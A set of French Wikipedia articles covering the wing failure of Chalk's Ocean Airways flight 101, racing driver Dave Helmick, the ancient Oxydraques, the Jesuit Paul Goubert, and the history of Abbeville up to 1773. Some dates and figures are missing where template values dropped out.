La fissuration non-détecté de la lisse de l'avion accidenté a permis à l'aile droite de fléchir davantage pendant le vol, ce qui a augmenté les forces de flexion au niveau de l'emplanture, de sorte que la fissure visible du revêtement extérieur a lentement augmenté en longueur à chaque vol suivant, jusqu'à ce que l'aile soit tellement affaiblie qu'elle ne puisse plus supporter les charges aérodynamiques, et l'aile s'est finalement détachée du fuselage. Le carburant contenu dans l'aile s'est alors libéré et s'est immédiatement enflammé, provoquant l'incendie observé par des témoins au sol. 
Par pur hasard, un touriste new-yorkais a pu filmer les derniers instants du vol 101 avec son téléphone portable alors que l'avion plongeait vers l'océan. Les images montrent clairement l'avion et l'aile droite en feu tombant sur deux points distincts au moment où ils ont heurté l'eau.
Après examen de l'épave, les enquêteurs ont découvert qu'en plus des renforts extérieurs, des renforts intérieurs avaient également été fixés à l'emplanture des deux ailes. Cependant, les dossiers de maintenance relatifs à ces réparations n'étaient pas disponibles. Les enquêteurs ont également conclu que la fissuration de la lisse qui a provoqué la perte de l'aile s'était probablement complètement rompue un certain temps avant l'accident, ce qui avait entraîné un affaiblissement important de la structure de l'aile.
Conséquences.
Après l'accident du vol 101, tous les avions restants de la flotte de Chalk's Ocean Airway furent cloués au sol. Par la suite, on découvrit qu'ils souffraient tous de graves problème liés à la corrosion et que beaucoup d'entre eux présentaient des signes de réparations d'une qualité inférieure lors des opérations de maintenance. Deux ans plus tard, Chalk's Ocean Airway, qui était alors l'une des plus anciennes compagnies aériennes du monde, fit faillite.
Médias.
L'accident a fait l'objet d'un épisode dans la série télé "Air Crash" nommé « Vacances mortelles » (saison 9 - épisode 8).

</doc>
<doc id="8731600" url="https://fr.wikipedia.org/wiki?curid=8731600" title="Dave Helmick">
Dave Helmick

Le Docteur Dave Helmick, né en 1937 et mort en mai 2019, est un pilote automobile américain sur circuits à bord de voitures de sport Grand Tourisme de marque Porsche, habitant alors à Hialeah (East Strodsburg, PA).
Biographie.
Radiologue de profession, notamment pour l'armée américaine, il commence sa carrière automobile en 1963 sur le circuit de Watkins Glen au traditionnel " Grand Prix du Week-End" Sports Car Régional de la SCCA (déjà sur Porsche). Trois ans plus tard il finit du Grand Prix de la ville de Paris organisé à Montlhéry (sur Porsche 356 Super), alors qu'il est encore stationné en France (des soldats américains habitant à Olivet près d'Orléans jusqu'en 1967, date du départ des bases de l'OTAN françaises).
Après une belle lors des de Watkins Glen en , il remporte surtout la saison suivante avec une voiture personnelle les 12 Heures de Sebring inscrites en Championnat IMSA GT avec Hurley Haywood et Peter Gregg, puis les 24 Heures de Daytona en 1977 associé à John Graves (le père de son épouse) et encore à Haywood (pilote d'usine Porsche) pour l'écurie Escargot dans le cadre cette fois du Championnat du monde des voitures de sport, par deux fois sur Porsche Carrera RSR. Haywood préfère en effet la seconde fois conduire sur une voiture éprouvée, se méfiant encore de la fiabilité des toutes nouvelles Porsche 934 et 935 Turbo, quitte à passer par une équipe de moindre notoriété. Entre 1973 et 1977 Helmick obtient également des places d'honneur lors des 6 Heures du Mid-Ohio ( en 1975 avec John O'Steen et en 1973 avec O'Steen et Graves, à la suite d'une en 1972 avec O'Steen).
Après avoir pratiqué sa profession médicale, il se retire à Phoenix (Arizona).

</doc>
<doc id="8731624" url="https://fr.wikipedia.org/wiki?curid=8731624" title="Oxydraques">
Oxydraques

Les Oxydraques (en grec ancien Ὀξυδράκαι, en latin "Oxydracæ"), sont un ancien peuple de l'Inde cisgangétique, qui habitait au confluent des rivières Ravi (Hydraote) et Chenab (Acésine).
Les Oxydraques sont connus en relation avec la campagne conduite en Inde en 326 avant notre ère par Alexandre le Grand, après la conquête de l'Empire perse. 
Situation.
Le pays des Oxydraques correspond aux environs de la ville ancienne d'Uch (Outche), dans le royaume de Lahore (aujourd'hui Ahmedpur Sharqia, District de Bahawalpur au Pakistan).
Histoire.
Quand l'armée d'Alexandre arrive dans le Nord de l'Inde, les Oxydraques s'unissent avec leurs voisins Cathéens et Malliens pour lui résister. Après avoir vaincu les Cathéens à Sagala (actuel Pendjab pakistanais), Alexandre met le siège devant la capitale des Oxydraques et la prend au terme d'un long combat, pendant lequel, « s'étant jeté seul dans la ville, il brava héroïquement les plus grands dangers ».

</doc>
<doc id="8731625" url="https://fr.wikipedia.org/wiki?curid=8731625" title="Paul Goubert">
Paul Goubert

Paul Goubert, né le à Orange et mort le à Alès est un jésuite et historien français, spécialiste de l'Orient et du monde byzantin.
Biographie.
Né le à Orange dans le Vaucluse, Paul Goubert est l'aîné d'une famille de cinq enfants. Son père, Joseph Goubert, est un médecin qui fut également maire de Piolenc (Vaucluse) ; sa mère est la sœur de l'archéologue et épigraphiste Louis Jalabert.
Scolarisé au collège Louis Gonzague, puis à Bollengo en Italie à cause de la Première Guerre mondiale, il entre chez les Jésuites au noviciat à dix-huit ans.
Plus tard, il enseigne à Saint-Joseph d'Avignon puis à l'Institut catholique de Lyon.
De 1951 à 1956, Paul Goubert est en poste à l'Institut pontifical oriental de Rome.
Mort à Alès le , il est inhumé à Lalouvesc en Ardèche.

</doc>
<doc id="8731626" url="https://fr.wikipedia.org/wiki?curid=8731626" title="Histoire d'Abbeville">
Histoire d'Abbeville

L’histoire d'Abbeville commence au Paléolithique ancien, d’après les silex taillés mis au jour depuis le qui démontrent que le site d’Abbeville était occupé par l'homme, il y a . Mais ce n’est qu’au que le nom d’Abbeville apparaît pour la première fois dans un document écrit. La ville se développa au Moyen Âge et à l'époque moderne. Elle subit d'importantes destructions au cours de la Seconde Guerre mondiale et fut reconstruite dans les années 1950.
Historiographie.
Les travaux de Charles Léopold Louandre et d'Ernest Prarond, historiens locaux du XIXe siècle qui ont beaucoup consulté les archives de la ville, sont incontournables pour étudier l'histoire d'Abbeville avant la Révolution française. En effet, les archives anciennes de la ville ont été en grande partie détruites, lors du bombardement d'Abbeville par l'aviation allemande, 20 mai 1940, selon Léo Noyer Duplaix et Romain Zechser, et Sébastien Drolet (En 1941, selon Raphaël Clotuche et Tahar Ben Redjeb).
En 1902, Alcius Ledieu avait publié un inventaire des archives conservées dans les séries AA et BB des Archives municipales d'Abbeville, ce qui permet de disposer d'un bon aperçu des documents disparus.
Des archives pré-révolutionnaires ne subsistent que quelques plans et représentations de la ville, un cartulaire, le "Livre blanc" (1147-1521), et le "Livre rouge" (≈ 1280-1516), un recueil d'actes de procédures civiles et criminelles de l'échevinage.
Si le "Livre blanc" est un véritable outil de défense des privilèges de la commune d'Abbeville, dont le choix des actes, leur présentation, et la langue utilisée pour les transcrire, participe à la création d'une mémoire collective du pouvoir communal, le "Livre rouge" illustre , afin de fournir la preuve de cet exercice par les maires et échevins.
Le rôle du "Livre blanc" dans l'historiographie de la ville fut essentiel : au XIXe siècle, pour écrire l'histoire d'Abbeville, les érudits locaux appuyaient leur démonstration sur le narratif imposé par le cartulaire, sans approche globale du document et en ne s'intéressant qu'au contenu des chartes. Ils mirent ainsi en exergue la réintégration du comté de Ponthieu dans le royaume de France, mais éludèrent la domination bourguignonne sur la région entre 1435 et 1477.
Raphaël Clotuche, dans un article destiné à recontextualiser historiquement les découvertes réalisées lors de l'opération archéologique menée en 1994 et 1995 dans le centre-ville historique, déplorait l'absence d'une étude récente sur l'histoire globale de la ville, excepté une publication de Micheline Agache-Lecat sur les origines d'Abbeville. Pour pallier ce manque, et retracer l'histoire de la ville, Raphaël Clotuche dut s'appuyer sur les écrits de Charles Léopold Louandre et d'Ernest Prarond, avec les biais que ces sources de seconde main supposent : ainsi, celles-ci sont muettes pour la fin du XIIIe siècle, et très loquaces à partir de la seconde moitié du XVe siècle. Selon Raphaël Clotuche, ce silence pour la fin du XIIIe siècle s'explique par l'absence de matériau archivistique à disposition de ces érudits.
En 2008, Raphaële Jaminon-Boinet, avec sa thèse consacrée au comté de Ponthieu entre les XIIIe et XVIe siècles, dans laquelle la ville d'Abbeville occupe une place importante, a renouvelé les travaux d'Ernest Prarond. En 2020, Romain Telliez propose pour la première fois une édition du Livre rouge. En effet, jusqu'à présent, malgré la publication d'actes dans plusieurs recueils, ce manuscrit n'avait fait l'objet que de deux études globales : un inventaire par Ernest Prarond du "Livre rouge" et du "Livre blanc", et en 1930, une analyse par Jean Boca de la justice criminelle à Abbeville au Moyen Âge.
Préhistoire.
Paléolithique inférieur.
Le sous-sol d’Abbeville renferme de nombreux vestiges du Pléistocène. Jacques Boucher de Perthes fut le premier à découvrir une industrie lithique datant de l’Acheuléen sur le site du Moulin Quignon. Cette découverte passe pour être un élément fondateur de la préhistoire en tant que science.
L’abbé Breuil proposa de remplacer le terme chelléen désignant une industrie lithique, antérieure à l'Acheuléen, caractérisée par des bifaces grossiers et irréguliers, par le terme « Abbevillien », en référence aux sites de la haute terrasse de la Somme à Abbeville dont les sédiments n'étaient pas remaniés. Cependant cette appellation est tombée en désuétude aujourd’hui et les silex abbevilliens considérés comme partie intégrante de la civilisation acheuléenne.
Les deux principaux sites étudiés par l’archéologie sont la carrière Carpentier et la carrière de Menchecourt tous deux .
En 2016-2017, des sondages archéologiques effectués sur le site du Moulin Quignon ont permis de mettre au jour des silex taillés bifaces datant de 670 000 à 650 000 ans avant notre ère.
Antiquité.
Pour la période de l’Antiquité, les sources littéraires antiques sont muettes. Les fouilles archéologiques, menées dans le centre-ville d'Abbeville à la fin des années 1990, n'ont pas mis au jour l'existence d'une implantation humaine permanente durant l'Antiquité. Tahar Ben Redjeb précise toutefois qu'une couche stratigraphique antérieure au IXe siècle n'a pu être étudiée lors de la campagne de fouilles.
Les sources littéraires des XVIIIe et XIXe siècles mentionnent la mise au jour de mobiliers antiques à Abbeville, en particulier, lors des travaux de réfection ou de démolition des murailles de la ville, mais sans toujours préciser le lieu exact de la découverte. En 1844, un gisement archéologique gallo-romain, situé entre le fleuve Somme, la Porte Marcadé et le bois de Campanelle, a été découvert lors des travaux d'implantation d'un gazomètre. Ce gisement contenait de très nombreuses amphores, des restes de haches et des ossements d'animaux.
A la fin du XIXe siècle, deux cimetières mérovingiens ont été retrouvés : un situé en bas de la côte de la Justice, et un autre à la jonction de la rue de Thuison et du chemin vers le cimetière de la Chapelle . Ces deux cimetières sont situés en dehors de la ville proprement dite.
De nombreux vestiges des époques gauloises et gallo-romaines ont été découverts dans les alentours de la ville. C'est ainsi qu'en 1808, Laurent Joseph Traullé, procureur impérial, découvre un chaland fluvial gallo-romain du IIe siècle dans l'ancien lit de la Somme, à Fontaine-sur-Somme. Les vestiges de ce navire ont aujourd'hui disparu, mais il est possible de le reconstituer grâce aux descriptions précises de Laurent Joseph Traullé, publiées dans des lettres adressées à Antoine Mongez.
Le territoire d'Abbeville était situé sur la "civitas" des Ambiens. La Baie de Somme n’avait pas à cette époque la configuration qu’elle a aujourd’hui. Elle était plus reculée à l’intérieur et formée de plusieurs îles et îlots. Le site de ce qui devint Abbeville était un espace marécageux entouré de forêts, situé à l’écart de la voie romaine allant de Samarobriva (Amiens) à Gesoriacum (Boulogne-sur-Mer) : il est ainsi très probable qu'aucun ensemble urbain d'importance ne se trouvait sur le territoire d'Abbeville. Toutefois, les nombreuses découvertes archéologiques laissent penser à l'existence d'un habitat dispersé, voire de petits hameaux.
Moyen Âge.
Haut Moyen Âge.
Période mérovingienne : fondation de l’abbaye de Saint-Riquier.
En 625 Riquier de Centule fonda un monastère à Centule (aujourd’hui Saint-Riquier) en latin "Centula", qui suivit la règle de saint Colomban.
Le roi des Francs Dagobert attribua à Riquier une partie de la forêt de Crécy, dont l'ermitage devint l'abbaye de Saint-Riquier : c'est l'acte de naissance du domaine abbatial d'Abbeville.
Période carolingienne : naissance d’Abbeville.
Abbeville est mentionnée pour la première fois dans un inventaire des biens de l'abbaye de Saint-Riquier. Ce document, réalisé à la demande de l'empereur Louis le Pieux, a été recopié dans la "Chronique de l'abbaye de Saint-Riquier", rédigée par Hariulf au . Il signale parmi les domaines que possédait l’abbaye de Saint-Riquier en 831, celui d"'Abbatis Villa", la villa de l’abbé (Abbeville) : 
Dans ce document, Abbeville est considérée comme une "villa", c'est-à-dire, un domaine rural. Mais sans plus de détails de la part de Hariulf, il est impossible de connaître la localisation exacte de ce domaine, ni son apparence. Peut-être était-il en partie constitué par une île située au milieu de la Somme.
Selon Micheline Agache-Lecat, la "villa", de peu d'importance, était dépourvue de la moindre défense, car en 844, les envahisseurs vikings parvinrent à s'établir à quelques kilomètres de là, à Laviers, et lancèrent des raids dans la région.
Il est difficile de savoir quand ce territoire entra en possession de l’abbaye, ni quelles étaient son étendue et sa population. Hariulf affirme qu'Abbeville était propriété de l'abbaye depuis l'époque de saint Riquier. Le domaine n'est ainsi pas mentionné dans la charte de Louis le Pieux, que Hariulf reproduit consciencieusement.
Moyen Âge classique.
Hugues Capet sépare Abbeville de l’abbaye de Saint-Riquier.
La destruction de Centula et de Quentovic, son port, lors des invasions vikings, affaiblit durablement le pouvoir temporel des abbés de Saint-Riquier, et permit l'émergence d'un nouveau pouvoir, celui des abbés laïcs. Hugues Capet qui venait de marier sa fille Gisèle de France à Hugues, fondateur de la Maison de Ponthieu, comte de Montreuil, lui confia le gouvernement de la ville qui fut entourée de remparts. En tant qu'avoué du monastère de Saint-Riquier, le laïc chargé de défendre le monastère et ses intérêts temporels, le chevalier Hugues bénéficie des revenus des domaines et du service des paysans de l'abbaye, et à la différence des autres chevaliers de la région, de la protection d'un château-fort.
L’ancien nom de la rue Saint-Vulfran, cauchie du Castel, au centre de l’île, laisse à penser que le château-fort se trouvait à cet endroit. Ernest Prarond déjà, avait douté de cette hypothèse, un toponyme ne pouvant à lui seul constituer une preuve. Selon Micheline Agache-Lecat, les historiens locaux ont confondu le terme de "castellum", qui désigne tout autant un site urbain fortifié qu'un château-fort, avec celui de "castrum", qui lui se rapporte uniquement à un château-fort.
Le château-fort a été construit là où se trouve actuellement le lycée Saint-Pierre, .
Les comtes de Ponthieu.
Les comtes de Ponthieu étaient les lointains héritiers des comtes carolingiens qui assurèrent la sécurité du littoral et constituèrent une puissante maison féodale.
Les comtes de Ponthieu battaient monnaie à Abbeville depuis le . Ils possédaient un château situé près de la porte Saint-Gilles, au sud-est de la ville. En 1075, le comte Guy Ier de Ponthieu fonda à Abbeville, l'abbaye Saint-Pierre.
Au , l'abbé créa un hospice pour lépreux, la maladrerie des Frères du Val, qui fut déplacée à Grand-Laviers au siècle suivant à cause de l'extension de la ville. Désormais accessible aux bateaux de mer, Abbeville devint un port de la Manche, sous la dépendance des abbés de Saint-Riquier. Par la suite, l'ensablement de la baie de Somme a repoussé la mer à vers l'ouest. Abbeville, cependant, continua d'être un port de commerce et devint la capitale du Ponthieu. Elle s'étendit sur les deux rives de la Somme, sur la rive droite, sur la pente des coteaux et sur la rive gauche, dans les marais.
En 1096, Gui de Ponthieu, reçut, sous les murs d'Abbeville, Godefroy de Bouillon et son armée partant pour la Première croisade. Le jour de la Pentecôte 1098, Gui de Ponthieu arma chevalier Louis le Gros, héritier de la couronne de France.
Présence de l'Église à Abbeville.
En 1075, Guy Ier de Ponthieu fonda un prieuré. En 1100, grâce à un don du roi de France Philippe Ier, le prieuré fut installé à Abbeville. Le territoire donné par le roi était autrefois occupé par un château (castrum). Le comte Guy de Ponthieu fit don au prieuré de la seigneurie de Barly près de Labroye. La fondation du prieuré fut confirmée par l'évêque Geoffroy d'Amiens, en 11062. Le prieuré fut affilié dès l'origine à l'abbaye de Cluny.
La ville comptait au Moyen Âge un nombre important d'église dont la principale était l'église collégiale Saint-Vulfran dotée d'un chapitre de chanoines
Les autres paroisses étaient : Saint-André, Saint-Éloi, Saint-Georges, Saint-Gilles, Saint-Jacques, Saint-Jean des Prez, Saint-Nicolas, Saint-Paul, Saint-Sépulcre, Sainte-Catherine et Notre-Dame du Castel.
La ville était également dotée d'un hôpital dirigé par le prieuré du Saint-Esprit dépendant du prieuré Saint-Pierre et Saint-Paul.
La commune d'Abbeville.
En 1130, Guillaume Talvas accepta de vendre aux bourgeois d'Abbeville leurs libertés. Le 9 juin 1184, le comte Jean Ier de Ponthieu confirma par écrit l'affranchissement de la commune accordé par son aïeul. Parti en croisade avec le roi Philippe Auguste, il mourut au siège de Saint-Jean-d'Acre, en 1191.
À Abbeville, les hommes membres de la commune furent désignés sous le nom de jurés parce qu'ils s'engageaient, par serment, à se prêter aide et assistance mutuelle. Les non-bourgeois étaient qualifiés de manants, hommes libres de condition inférieure aux bourgeois. Les nobles purent également devenir bourgeois d'Abbeville et y exercer de hautes fonctions municipales.
Le premier échevinage de la ville était situé sur la place du Marché au blé (place de l'hôtel de ville). En 1209, Guillaume de Ponthieu le fit transférer à côté du beffroi édifié en 1126. Au sommet de ce beffroi, un guetteur surveillait la campagne alentour.
En 1214, la milice d'Abbeville prit part à la bataille de Bouvines.
Essor du commerce abbevillois au.
Avec le développement rapide du commerce du sel (depuis Rue), de la waide, la ville prit son essor. Abbeville devint une ville drapante qui fabriquait du drap de laine. Elle fit partie de La "Hanse des dix-sept villes", qui était en fait avant 1230, une ghilde de marchands drapiers de villes des Pays-Bas et de la France du Nord (dont le nombre dépassa, largement, dix-sept), fréquentant les foires de Champagne.
Son port était un des premiers du royaume et son commerce considérable.
La ville se peupla et s'agrandit, les nouveaux quartiers de Saint-Gilles, du Bois, Saint-Jacques, Saint-Jean des Près, Bourg du Vimeu se bâtirent. Des églises nouvelles furent construites : Saint-Gilles (1205), Saint-Jean de Rouvroy (1206), Saint-Jean-des-Près (1223), ainsi que des hôpitaux, la maison des Templiers de Thuyson et le refuge de l'abbaye du Gard (1250).
Abbeville possession anglaise.
En 1259, les États généraux du royaume se tinrent à Abbeville. Henri III d'Angleterre y rencontra Louis IX de France pour négocier le traité de Paris qui devait régler la question des conquêtes de Philippe Auguste. Ce traité fut signé en 1259.
En 1254, Éléonore de Castille, fille de la comtesse Jeanne, épousa le fils aîné du roi Henri III d'Angleterre, le futur Édouard. Le comté de Ponthieu échut à Éléonore à la mort de sa mère en 1279. Abbeville et le Ponthieu demeurèrent sous domination anglaise sous les règnes d’Edouard , Édouard II et Édouard III jusqu'à sa confiscation par le roi de France, Philippe VI de Valois, en 1337. La confiscation du Ponthieu marqua le début de la guerre de Cent Ans.
Bas Moyen Âge.
La guerre de Cent Ans, Abbeville fidèle au roi de France.
Dès le début de la guerre de Cent Ans, Abbeville fut mêlée de près aux événements. En 1340, Abbeville, port de mer depuis le , fournit douze vaisseaux de guerre, marins et 192 arbalétriers à la bataille de L'Écluse.
En 1346, Philippe VI de Valois franchit la Somme à Abbeville, au pont de Talence, pour rejoindre le champ de bataille de Crécy et affronter les armées du roi d'Angleterre, Édouard III.
Après la bataille de Poitiers de 1356, les Anglais et les partisans du roi de Navarre Charles le Mauvais ravagèrent les campagnes autour d'Abbeville. Pour les empêcher d'établir des bases de repli, la milice bourgeoise d'Abbeville fit démolir les châteaux de Long, Eaucourt, Drucat, Mautort et Mareuil. Cependant, par le traité de Brétigny de 1360, Abbeville et le Ponthieu redevenaient possession anglaise le 18 mai 1361. En 1347, Édouard III établit une cour de justice souveraine à Abbeville et interdit aux habitants de faire appel à la justice du roi de France. D'autre part, le roi de France chargea son premier écuyer Martelet du Mesnil d'organiser la contestation du pouvoir anglais. C'est dans ce contexte que se produisit l'arrestation d'Enguerrand Ringois.
L'épisode de l'arrestation et de la mort de Ringois nous est raconté dans un passage des "Grandes chroniques de France" (Règne de Charles V. ) : 
La raison exacte de l'arrestation de Ringois ne nous est pas connue. Edouard III a-t-il voulu régler son compte à un Abbevillois récalcitrant? A-t-il par la même occasion voulu intimider les habitants du Ponthieu insubordonnés? On sait, par ailleurs, qu'Enguerrand Ringois, marin de son état, avait pris une part importante dans l'expédition projetée pour délivrer le roi Jean le Bon qui se solda par le pillage de Winchelsea. Quoi qu'il en soit, après avoir été arrêté, Ringois fut détenu pendant onze semaines au château d'Airaines, puis, sur ordre d’Édouard III, conduit au château de Douvres, en Angleterre et précipité dans la mer du haut des falaises pour avoir refusé de prêter serment de fidélité au roi d'Angleterre, comme nous le dit la version française de cet événement, rédigée en 1369.
Cependant, la situation évoluait favorablement pour le roi de France Charles V. Le 23 avril 1369, il donna l'ordre à Hugues de Châtillon-Dampierre, grand-maître des arbalétriers de replacer le Ponthieu sous sa souveraineté. Le maïeur d'Abbeville, Firmin de Touvoyon invita Hugues de Châtillon à se présenter avec ses troupes à la porte du Bois, tandis que les Anglais abandonnaient la ville. La milice bourgeoise d'Abbeville avec à sa tête Firmin de Touvoyon et Pierre Langagneur se joignit aux troupes d'Hugues de Châtillon et prirent Pont-Rémy le mai 1369. Touvoyon et Langagneur furent armés chevaliers sur le champ de bataille. En récompense de la fidélité des Abbevillois, Charles V accorda, le 19 juin 1369, aux Abbevillois, le droit de faire essaimer, sur les armoiries de la ville, des fleurs de lys d'or.
En 1393, le roi Charles VI vint à Abbeville et logea à l'abbaye Saint-Pierre. Il venait y superviser les négociations de paix avec l'Angleterre qui se tenaient à la frontière entre le Boulonnais et le Ponthieu.
Abbeville entre France et Bourgogne.
Le traité d'Arras signé entre le roi de France et le duc de Bourgogne avait pour but de mettre fin à l'alliance anglo-bourguignonne. En contrepartie, le roi de France accordait au duc de Bourgogne, les Villes de la Somme, dont Abbeville mais gardait la possibilité de les racheter.
Dès son accession au trône Louis XI s'empressa de racheter les villes de la Somme pour écus d'or. Il arriva à Abbeville le 27 septembre 1463 et se rendit ensuite à Hesdin pour livrer la somme au duc de Bourgogne Philippe le Bon.
La guerre du Bien public força Louis XI à céder de nouveau les villes de la Somme au duc de Bourgogne par le traité de Conflans en 1465. Le 2 mai 1466, le comte de Charolais, futur Charles le Téméraire prenait possession d'Abbeville et fit brûler afin d'impressionner les habitants.
Le 22 juillet 1471, Charles le Téméraire, réunit à Abbeville, les états des Pays-Bas bourguignons pour lever des nouveaux impôts et de nouvelles troupes. Le duc de Bourgogne fit construire un château dans la ville. Le 17 janvier 1477, Abbeville et le Ponthieu étaient réunis à la couronne de France.
Développement d'Abbeville au.
Depuis la fin du , la ville connut une certaine prospérité et un accroissement de son activité et de sa population. Les chartreux s'établirent à Thuyson dans la maison des Templiers. On élargit le canal Marchand pour favoriser la navigation. Abbeville possédait deux ports : le Port du Guindal pour la navigation fluviale et la Fosse de Valoires pour les navires de mer.
En 1467 et 1470 ainsi qu'entre 1480 et 1483, des épidémies "d'influence", maladies épidémiques, ravagèrent Abbeville.
Louis XI fit construire de nouveaux remparts et élargit ainsi le territoire urbain. La fin du fut une période d'intense construction : église Saint Gilles (1414-1485), église Saint-Jacques (1482), hôtel de la Grutuze (1493), le couvent des Minimes (1500), la construction de la collégiale Saint-Vulfran débuta en 1488, la façade et la nef furent terminées en 1539. Elle demeure, aujourd'hui, l'un des plus beaux spécimens de l'architecture gothique flamboyante.
L'industrie des charpentiers de navires se développa à l'extrême fin du de même que l'horlogerie et l'imprimerie. Depuis 1486, une imprimerie fonctionnait dans la Maison du Gard. Abbeville fut ainsi la seule ville de Picardie à posséder un atelier d'imprimerie avant le .
Époque moderne.
La Renaissance : Abbeville entre guerre et Réforme.
En 1493, le roi Charles VIII vint à Abbeville inspecter les défenses de la ville. En 1514, ce fut Louis XII qui vint à Abbeville pour épouser Marie d'Angleterre sœur du roi Henri VIII, le 9 octobre dans l'Hôtel de Grutuze où il résidait.
François Ier vint lui aussi à Abbeville avec la reine Claude de France, le 23 juin 1517. Il y rencontra le cardinal Wolsey, représentant le roi d'Angleterre dans le but de former une ligue contre Charles Quint.
En 1523, les Anglais se rangèrent finalement aux côtés de Charles Quint. La guerre reprit entre la France et l'Empire, les armées du roi d'Espagne ravagèrent le Ponthieu. Abbeville fut épargnée grâce à ses remparts et sa milice bourgeoise, la ville subit néanmoins de fréquentes réquisitions. Cette même année, une épidémie de peste ravagea Abbeville.
En 1531, François Ier effectua une nouvelle visite dans la ville. Le coup le plus sérieux porté à Abbeville fut une série de raids anglais menés par le duc de Suffolk sur les côtes de l'estuaire de la Somme en 1544, après la chute de Boulogne-sur-Mer et Montreuil.
Fin avril 1550, le roi Henri II passa par Abbeville et autorisa les habitants à lancer un emprunt de pour réparer les dégâts et les dépenses dus à la guerre. Il ordonna la destruction des maisons du faubourg du Bois et du faubourg Marcadé et de construire le bastion de Longueville dont les vestiges sont toujours visibles.
Le protestantisme s'implanta modestement à Abbeville, peu nombreux, les huguenots ne professaient pas publiquement leur religion. Ils s'assemblaient dans le château du gouverneur qui était lui-même protestant. Ce dernier fut tué par la foule, le 6 juillet 1562, à l'intérieur de l’Échevinage.
Conformément à l'édit de Charles IX de 1566, un collège fut créé à Abbeville et son principal nommé le 17 décembre de la même année. En 1568, François Cocqueville, un chef de guerre protestant, pénétra dans le Ponthieu avec . Il pilla et saccagea l'abbaye de Dommartin, les villes, les églises et châteaux de la région de l'Authie et de Saint-Valery-sur-Somme. Pourchassé par le Maréchal de Brissac, Cocqueville fut capturé avec plusieurs des siens. Ils furent décapités sur la place du marché d'Abbeville.
En 1582, une nouvelle épidémie de peste sévit à Abbeville.
En 1588, après l'assassinat d'Henri de Guise, chef de la Ligue, les Abbevillois indignés adhérèrent à la Sainte Ligue et en décembre 1589, ils détruisirent le château de Charles le Téméraire. Mais après l'assassinat du roi Henri III, les Abbevillois, lassés des excès de la Ligue se rallièrent à Henri IV, roi de France et de Navarre qui venait d'abjurer le protestantisme et de se convertir au catholicisme. Henri IV vint à Abbeville, le 17 décembre 1594. Abbeville était la première ville de Picardie qui fit sa soumission au nouveau roi. Henri IV fit consolider les défenses de la ville.
Abbeville au : le Vœu de Louis XIII.
Au début du une épidémie de peste dépeupla Abbeville.
Louis XIII vint une première fois à Abbeville le 21 décembre 1620. Le 16 juin 1625 ce fut sa sœur Henriette de France qui passa par Abbeville en allant en Angleterre épouser le roi Charles.
Une épidémie de peste sévit de nouveau durant les années 1635, 1636 et 1637. En 1636, dix religieuses carmélites venant d'Amiens fondèrent le couvent Jésus Maria qui fonctionna - hormis durant la période révolutionnaire - jusque 1998.
À partir de 1635, la guerre fit de nouveaux ravages dans le Ponthieu où la soldatesque de Jean de Werth et de Piccolomini fit régner destruction et terreur. En 1636 Richelieu vint à Abbeville pour renforcer les défenses : des taxes sur le vin permirent d’élever de nouvelles fortifications.
Le Vœu de Louis XIII fut prononcé dans l'église des Minimes en juillet 1637. Louis XIII, accompagné de Richelieu, décida de consacrer une lampe à perpétuité à la Vierge dans la cathédrale Notre-Dame de Paris. Le roi revint à Abbeville, en juillet 1638 et le 30 mai 1639.
En 1656, , qui avaient participé à révolution d'Angleterre débarquèrent en France et prirent leurs quartiers à Abbeville qu'ils quittèrent pour aller rejoindre l'armée de Turenne au siège de Valenciennes.
En 1662, l'abbaye de Willencourt fut transférée à Abbeville et y resta jusqu'à la Révolution française.
Quelque temps après, Balthazard Fargues vendit Abbeville à Don Juan d'Autriche et après en avoir touché le prix, il refusa de livrer la ville, leva des troupes pour son propre compte et se répandit dans le Ponthieu et rançonna les habitants. Il fut arrêté, jugé et pendu, sur la place Saint-Pierre d'Abbeville, le 17 mars 1665.
Abbeville sous Louis XIV : création de la Manufacture des Rames.
La ville prit un nouvel essor grâce à l'action de Colbert qui permit à Josse Van Robais, fabricant de drap hollandais, de s'installer à Abbeville avec ses ouvriers et d'y fonder la Manufacture royale des Rames. Par lettres patentes de 1664, Louis XIV accorda à Josse van Robais les avantages suivants :
En 1685, à la révocation de l'édit de Nantes, le temple protestant d'Abbeville fut détruit et les ouvriers de Van Robais, persécutés, émigrèrent; la population de la ville décrut alors fortement.
En 1716, la forte concentration d'ouvriers - étroitement surveillés par les Van Robais - conduisit à l’une des plus grandes grèves de l’Ancien Régime. Protestant contre leurs conditions de travail et les salaires excessivement bas, les ouvriers cessèrent le travail. Cependant la grève fut réprimée par la troupe.
Pendant la guerre de Succession d'Espagne, la présence de troupes était permanente dans le Ponthieu. De nombreux malades et blessés furent soignés en ville. En 1708, après la prise de Lille, les troupes du duc de Marlborough et d'Eugène de Savoie s'avancèrent à plusieurs reprises aux portes d'Abbeville, rançonnant les fermes et les villages. L'hiver 1709 fut terrible; la population périt de froid, de faim et de misère. À cette époque l'industrie était totalement affaiblie et l'État dut secourir les fabricants de draps.
Abbeville au "Siècle des Lumières" : l'affaire La Barre.
En 1717, le tsar de Russie, Pierre le Grand, passa à Abbeville.
Le matin du 9 août 1765, deux actes de profanation sont découverts à Abbeville : des entailles à l'arme blanche sur le crucifix du pont d'Abbeville et un dépôt d'immondices sur une représentation du Christ dans un cimetière d'Abbeville. Le chevalier de La Barre suspecté, avec d'autres jeunes gens, était arrêté le octobre 1765. On trouva chez lui un exemplaire du "Dictionnaire philosophique" de Voltaire et trois livres licencieux ce qui aggrave les soupçons.
La machine judiciaire se mit en marche en février 1766. Le 28 février 1766, le chevalier de La Barre fut condamné par le tribunal d'Abbeville pour « impiété, blasphèmes, sacrilèges exécrables et abominables » à faire amende honorable, à avoir la langue tranchée, à être décapité et brûlé. Il est décidé que La Barre serait soumis à la question ordinaire et à la question extraordinaire avant son exécution. La Barre fit appel du jugement devant le Parlement de Paris. Il fut transféré à la prison de la Conciergerie et comparut devant la Grand-Chambre du Parlement de Paris. Il n'eut pas le droit d'être assisté par un avocat. Le jugement d'Abbeville fut confirmé le 4 juin 1766.
Avant son exécution, La Barre fut soumis à la question, ses jambes furent broyées. La main droite et la langue tranchée, sur la Grand-Place d'Abbeville, son corps décapité fut finalement livré aux flammes, avec le "Dictionnaire philosophique" de Voltaire, sur ce même lieu.
Le martyre du chevalier de La Barre incita Voltaire à poursuivre son combat contre le fanatisme religieux. Dans son article « Torture » de l'édition de 1769 du "Dictionnaire philosophique", il fit ce récit :
Le 2 novembre 1773, la poudrière d'Abbeville explosa, tuant 150 personnes et endommageant près de .
